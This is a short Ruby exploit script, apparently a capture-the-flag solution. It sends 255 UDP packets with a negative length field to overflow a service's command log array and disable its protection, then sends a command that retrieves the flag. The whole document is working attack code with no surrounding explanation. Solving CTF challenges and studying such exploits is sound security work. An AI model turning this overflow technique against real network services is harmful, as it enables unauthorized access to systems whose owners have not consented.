#!/usr/bin/ruby

require 'socket'

host = ARGV[0]
port = ARGV[1]

sock = UDPSocket.new
sock.bind 0, 0

# overflow the command log array to unlock the protection
(0..254).each do |idx|
  header = [0, 0, -8].pack('SSL')
  sock.send header, 0, host, port
  puts sock.recvfrom(100)[0]
  puts "#{254-idx} left to go..."
end

# execute the flag getter command
header = [0, 0, 9].pack('SSL')
sock.send header, 0, host, port

puts sock.recvfrom(255)[0]
